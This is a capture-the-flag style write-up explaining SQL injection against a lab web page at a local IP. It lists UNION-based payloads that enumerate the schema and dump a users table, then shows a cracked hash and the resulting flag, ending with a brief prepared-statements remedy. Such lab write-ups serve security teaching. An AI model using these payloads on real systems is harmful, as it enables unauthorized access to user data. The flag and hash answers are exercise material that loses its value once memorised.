# SQL_Injection
Ahhhh the notorious SQL Injection. This attack from the hacker aims to manipulate the database specifically an SQL database to expose sensitive data such as user email and password if the website does have such. Basically if an Input is used to search through the database for a specif field, table or database data, and is not hanled properly by the server. A hacker can just simply append an Instruction to value that asks for the database to give out more information than what was originally purposed.

## Example
In http://192.168.43.251/index.php?page=member, we are presented with a page that has a form input. An obvious assumpution is that since the input requires a values to search for a particular member, that value is used by the server to query the database. We can simply check this by giving a value and appending to it anything that might error, or even tell us the type of SQL database that is beign used for example

If we give this value ' and then we get an error from the database then we know that the input is being taken straight to the database and is being as is. This is exacly what happens in this case. We receive the 
Error: "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1".
From here on out we can genlty manipulate the database and ask it to give the name of the tables, databases and the type of database being used. And so through a set of commands we are not only able to determine the type of database but alson all the databases along with their tables and fields.

## Commands
* 1  AND 1 = SLEEP(2);--
* 1 UNION (SELECT 1,2 FROM dual );--
* 1 UNION (SELECT TABLE_NAME, TABLE_SCHEMA  FROM information_schema.tables);--
* 1 UNION (SELECT COLUMN_NAME, 1 FROM information_schema.columns );--

    ### One of these tables is users
    Table : users
    > Colunm : user_id
    > Colunm : first_name
    > Colunm : last_name
    > Colunm : town
    > Colunm : country
    > Colunm : planet
    > Colunm : Commentaire
    > Colunm : countersign
 * And through a number of these commands we are able to retrieve out flag   
    ### Retrive flag
    * 1 UNION (SELECT user_id, first_name FROM users);--
    * 1 UNION (SELECT last_name, town FROM users);--
    * 1 UNION (SELECT country, planet FROM users);--
    * 1 UNION (SELECT Commentaire, countersign FROM users);--

    * instruction: Decrypt this password -> then lower all the char. Sh256 on it and it's good !   
    * hash : 5ff9d0165b4f92b14994e5c685cdce28

flag: 5ff9d0165b4f92b14994e5c685cdce28 -md5> fortytwo  -sha256> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 

## Remedy
* Now all of this  can be prevented by using prepared statements. Prepared statement will tell that database to look at the input as nothing else but just that, an input.

# Resources
    https://www.youtube.com/watch?v=ciNHn38EyRc